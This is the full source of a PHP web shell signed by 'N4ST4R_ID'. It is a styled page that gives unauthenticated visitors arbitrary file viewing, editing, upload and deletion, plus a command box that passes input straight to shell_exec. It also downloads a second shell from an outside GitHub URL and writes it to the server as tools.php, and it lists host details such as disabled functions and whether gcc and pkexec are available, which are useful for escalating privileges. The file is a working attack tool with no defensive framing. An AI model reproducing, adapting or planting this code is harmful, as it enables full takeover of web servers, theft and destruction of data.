<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="author" content="N4ST4R_ID">
  <title>Na}{tarrr</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
  <link rel="stylesheet" href="https://naxtarrr.netlify.app/css/shell_style.css">
</head>
<body>
  <?php
  error_reporting(0);
  $tools = base64_encode(file_get_contents("https://raw.githubusercontent.com/nastar-id/kegabutan/master/shelk.php"));
  echo "<div class='container'><div id='pw'>Home: <a href='?path=".getcwd()."'>".getcwd()."</a></div><br>";
  ?>
  <form method="GET">
    <input type="text" name="path" autocomplete="off" style="width:280px" class="textinput" required>
    <input type="submit" value="Go!!" class="submit">
  </form>

  <?php
  if (htmlspecialchars(isset($_GET["path"]))) {
    $path = $_GET["path"];
    $file = $_GET["file"];
    $folder = $_GET["folder"];
    $folder_name = basename($folder);
    $file_name = basename($file);
    ?>
    <script>
      const path = document.querySelector('input[name=path]')
      path.value = '<?php echo $_GET["path"]; ?>'
    </script>
    <br>
    <center>
      <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=createfolder"><button type="button" class="button-tools">Create Folder</button></a>
      <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=createfile"><button type="button" class="button-tools">Create File</button></a>
      <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=spawntools"><button type="button" class="button-tools">Spawn ToolKit</button></a>
      <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=info"><button type="button" class="button-tools">Info Min</button></a>
      <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=upload"><button type="button" class="button-tools">Upload File</button></a>
      <a href="?path=<?php echo htmlspecialchars($_GET["path"]); ?>&action=cmd"><button type="button" class="button-tools">Command</button></a>
    </center><br><br>

    <?php
    if ($_GET["action"] == "view") {
      echo "<p class='text-center'>Filename: $file_name</p><br>";
      echo "<textarea class='textarea' disabled>".htmlspecialchars(file_get_contents($file))."</textarea>";
    } elseif ($_GET["action"] == "edit" && $file) {
        ?>
        <form method="POST">
          <p class="text-center">
            Filename: <?php echo $file_name; ?>
          </p>
          <br>
          <?php echo "<textarea name='content' class='textarea'>".htmlspecialchars(file_get_contents($file))." </textarea>"; ?>
          <center><input type="submit" name="edit" value="Edit" class="submit"></center>
        </form>
        <?php
        if (isset($_POST["edit"])) {
          $editted = base64_encode($_POST["content"]);
          $save = saveme($file, base64_decode($editted));
          if ($save) {
            echo "<script>alert('Edit $file_name success')</script>";
            echo "<script>window.location = '?path=$path&action=edit&file=$file'</script>";
          } else {
            echo "Edit $file_name failed";
          }
        }
      } elseif ($_GET["action"] == "rename" && $file) {
        renames($file, $path, $file_name);
      } elseif ($_GET["action"] == "rename" && $folder) {
        renames($folder, $path, $folder_name);
      } elseif ($_GET["action"] == "delete" && $file) {
        if (unlink($file)) {
          echo "<script>alert('Delete $file_name success')</script>";
          echo "<script>window.location = '?path=$path'</script>";
        } else {
          echo "Delete $file_name failed";
        }
      } elseif ($_GET["action"] == "delete" && $folder) {
        if (is_dir($folder)) {
          if (is_writable($folder)) {
            @rmdir($folder);
            @shell_exec("rm -rf $folder");
            @shell_exec("rmdir /s /q $folder");
            echo "<script>alert('$folder_name Deleted')</script>";
            echo "<script>window.location = '?path=$path'</script>";
          } else {
            echo "Delete $folder_name failed";
          }
        }
      } elseif ($_GET["action"] == "spawntools") {
        $save = saveme($path."/tools.php", base64_decode($tools));
        echo "<center>";
        if ($save) {
          echo "<script>alert('Spawn Toolkit tools.php success')</script>";
          echo "<script>window.location = '?path=$path'</script>";
        } else {
          echo "Spawn Toolkit failed";
        }
        echo "</center>";
      } elseif ($_GET["action"] == "createfile") {
        ?>
        <br>
        <form method="POST">
          <center>
            <input type="text" name="filename" placeholder="Filename" class="textinput">
            <textarea name="filetext" class="textarea"></textarea>
            <input type="submit" name="touch" value="Create" class="submit">
          </center>
        </form>
        <?php
        if (isset($_POST["touch"])) {
          $filename = $_POST["filename"];
          $filetext = base64_encode($_POST["filetext"]);
          $save = saveme($path."/".$filename, base64_decode($filetext));
          if ($save) {
            echo "<script>alert('".$filename." has successfully created')</script>";
            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
          } else {
            echo "Create file failed";
          }
        }
      } elseif ($_GET["action"] == "createfolder") {
        ?>
        <form method="POST">
          <center>
            <input type="text" name="foldername" placeholder="Folder name" autocomplete="off" class="inputtext textinput">
            <input type="submit" name="cfolder" value="Create" class="submit">
          </center>
        </form>
        <?php
        if (isset($_POST["cfolder"])) {
          $fname = $_POST["foldername"];
          if (@mkdir($path."/".$fname)) {
            echo "<script>alert('$fname Created')</script>";
            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
          } else {
            echo "Create folder failed";
          }
        }
      } elseif ($_GET["action"] == "upload") {
        ?>
        <form method="POST" enctype="multipart/form-data">
          <center>
            <label for="naxx" class="button-tools">Choose File Here</label>
            <input type="file" name="nax_file" id="naxx">
            <input type="submit" name="upkan" value="Upload" class="submit">
          </center><br>
        </form>
        <?php
        if (isset($_POST["upkan"])) {
          if (move_uploaded_file($_FILES["nax_file"]["tmp_name"], $path."/".$_FILES["nax_file"]["name"])) {
            $file = $_FILES["nax_file"]["name"];
            echo "<script>alert('$file uploaded')</script>";
            echo "<script>window.location = '?path=".htmlspecialchars($path)."'</script>";
          } else {
            echo "<center>Upload fail</center>";
          }
        } else {
          echo "<center>No file selected</center>";
        }
      } elseif ($_GET["action"] == "cmd") {
        ?>
        <form method="POST">
          <center>
            <input type="text" name="cmd" placeholder="Command" autocomplete="off" class="inputtext textinput">
            <input type="submit" name="exec" value="Execute" class="submit">
          </center>
        </form>
        <?php
        if (isset($_POST["exec"])) {
          $cmd = $_POST["cmd"];
          echo "<div class='cmd'>".@shell_exec($cmd)."</div>";
        }
      } elseif ($_GET["action"] == "info") {
        echo '<div class="wrap">';
        infomin();
        echo '</div>';
      } else {
          ?>
          <div class="wrap">
            <table>
              <thead>
                <tr>
                  <th>Items</th>
                  <th>Size</th>
                  <th>Permission</th>
                  <th>Action</th>
                </tr>
              </thead>
              <tbody>
                <?php
                $scan = scandir($path);
                foreach ($scan as $folders) {
                  if (!is_dir($path."/".$folders) || $folders == ".." || $folders == ".") {
                    continue;
                  }
                  ?>
                  <tr>
                    <td nowrap="nowrap" width="450"><?php echo "<a href='?path=$path/$folders'><i class='fas fa-folder'></i> $folders</a>"; ?></td>
                    <td nowrap="nowrap" width="100"><center>---</center></td>
                    <td nowrap="nowrap" width="150">
                      <center>
                        <?php
                        if (is_writable($path."/".$folders)) {
                          $color = "lime";
                        } else {
                          $color = "red";
                        }
                        echo "<font color='$color'>".hi_permission($path."/".$folders)."</font>";
                        ?>
                      </center>
                    </td>
                    <td nowrap="nowrap" width="90">
                      <center><?php echo "
            <a href='?path=$path&action=rename&folder=$path/$folders'><i class='fas fa-pen'></i></a>
            <a href='?path=$path&action=delete&folder=$path/$folders'><i class='fas fa-trash-alt'></i></a>
            "; ?></center>
                    </td>
                  </tr>
                  <?php
                }

                foreach ($scan as $files) {
                  if (is_file($path."/".$files)) {
                    ?>
                    <tr>
                      <td nowrap="nowrap" width="450"><?php echo "<a href='?path=$path&action=view&file=$path/$files'><i class='fas fa-file'></i> $files</a>"; ?></td>
                      <td nowrap="nowrap" width="100"><?php echo "<center>".Size($path."/".$files)."</center>"; ?></td>
                      <td nowrap="nowrap" width="150">
                        <center>
                          <?php
                          if (is_writable($path."/".$files)) {
                            $color = "lime";
                          } else {
                            $color = "red";
                          }
                          echo "<font color='$color'>".hi_permission($path."/".$folders)."</font>";
                          ?>
                        </center>
                      </td>
                      <td nowrap="nowrap" width="90">
                        <center><?php echo "
              <a href='?path=$path&action=edit&file=$path/$files'><i class='fas fa-edit'></i></a>
              <a href='?path=$path&action=rename&file=$path/$files'><i class='fas fa-pen'></i></a>
              <a href='?path=$path&action=delete&file=$path/$files'><i class='fas fa-trash-alt'></i></a>
              "; ?></center>
                      </td>
                    </tr>
                    <?php
                  }
                }
                echo "</tbody></table></div>";
              }
            }

          function saveme($name, $content) {
            $open = fopen($name, "w");
            fwrite($open, $content);
            fclose($open);
            return $open;
          }

          function renames($item, $path, $name) {
            ?>
            <form method="POST">
              <center>
                <input type="text" name="newname" value="<?php echo $name; ?>" class="textinput inputtext">
                <input type="submit" name="rename" value="Rename" class="submit">
              </center>
            </form>
            <?php
            if (isset($_POST["rename"])) {
              $new = $_POST["newname"];
              if (rename($item, $path."/".$new)) {
                echo "<script>alert('$name successfully renamed')</script>";
                echo "<script>window.location = '?path=$path'</script>";
              } else {
                echo "Rename failed";
              }
            }
          }

          function Size($path) {
            $bytes = sprintf('%u', filesize($path));
            if ($bytes > 0) {
              $unit = intval(log($bytes, 1024));
              $units = array('B', 'KB', 'MB', 'GB');
              if (array_key_exists($unit, $units) === true) {
                return sprintf('%d %s', $bytes / pow(1024, $unit), $units[$unit]);
              }
            }
            return $bytes;
          }

          function infomin() {
            $curl = (function_exists("curl_version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $wget = (@shell_exec("wget --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $python = (@shell_exec("python --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $perl = (@shell_exec("perl --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $ruby = (@shell_exec("ruby --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $gcc = (@shell_exec("gcc --help")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $pkexec = (@shell_exec("pkexec --version")) ? "<font color='lime'>ON</font>" : "<font color='red'>OFF</font>";
            $disfuncs = @ini_get("disable_functions");
            $showit = (!empty($disfuncs)) ? "<font color='red'>$disfuncs</font>" : "<font color='lime'>NONE</font>";
            echo "<div class='infomin wrap'>";
            echo "OS: ".php_uname()."<br>";
            echo "SERVER IP: ".$_SERVER["SERVER_ADDR"]."<br>";
            echo "SOFTWARE: ".$_SERVER["SERVER_SOFTWARE"]."<br>";
            echo "Disabled Functions: $showit<br>";
            echo "CURL: $curl, WGET: $wget, PERL: $perl, RUBY: $ruby<br>PYTHON: $python, GCC: $gcc, PKEXEC: $pkexec";
            echo "</div>";
          }

          function hi_permission($items) {
            $perms = fileperms($items);
            if (($perms & 0xC000) == 0xC000) {
              $info = 's';
            } elseif (($perms & 0xA000) == 0xA000) {
              $info = 'l';
            } elseif (($perms & 0x8000) == 0x8000) {
              $info = '-';
            } elseif (($perms & 0x6000) == 0x6000) {
              $info = 'b';
            } elseif (($perms & 0x4000) == 0x4000) {
              $info = 'd';
            } elseif (($perms & 0x2000) == 0x2000) {
              $info = 'c';
            } elseif (($perms & 0x1000) == 0x1000) {
              $info = 'p';
            } else {
              $info = 'u';
            }
            $info .= (($perms & 0x0100) ? 'r' : '-');
            $info .= (($perms & 0x0080) ? 'w' : '-');
            $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x') :
              (($perms & 0x0800) ? 'S' : '-'));
            $info .= (($perms & 0x0020) ? 'r' : '-');
            $info .= (($perms & 0x0010) ? 'w' : '-');
            $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x') :
              (($perms & 0x0400) ? 'S' : '-'));
            $info .= (($perms & 0x0004) ? 'r' : '-');
            $info .= (($perms & 0x0002) ? 'w' : '-');
            $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x') :
              (($perms & 0x0200) ? 'T' : '-'));
            return $info;
          }
          ?>
        </div>
        <div class="footer">
          Coded & Designed By <a href="https://www.naxtarrr.my.id"><font color="gold">N4ST4R_ID</font></a>
        </div>
        <script>
          const file = document.querySelector('input[type="file"]')
          const label = document.querySelector('label[for="naxx"]')
          file.addEventListener('change', () => {
            if (file.value.length == '0') {
              label.innerText = 'Choose File Here'
            } else if (file.value.length >= '30') {
              value = file.value.substring(0, 30) + "..."
              label.innerText = value
            } else {
              label.innerText = file.value
            }
          })
        </script>
      </body>
    </html>
